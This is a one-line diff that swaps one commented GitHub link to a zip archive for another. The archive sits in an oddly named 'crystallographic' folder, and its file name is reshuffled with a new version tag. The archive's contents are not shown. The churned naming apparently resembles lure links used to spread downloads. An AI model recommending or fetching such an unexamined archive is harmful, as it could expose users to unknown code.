@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/ducmanh04/jumper-analytics-assignment/main/crystallographic/jumper-analytics-assignment-v3.3-beta.1.zip
+# https://github.com/ducmanh04/jumper-analytics-assignment/raw/refs/heads/main/crystallographic/analytics-assignment-jumper-v1.8-beta.4.zip
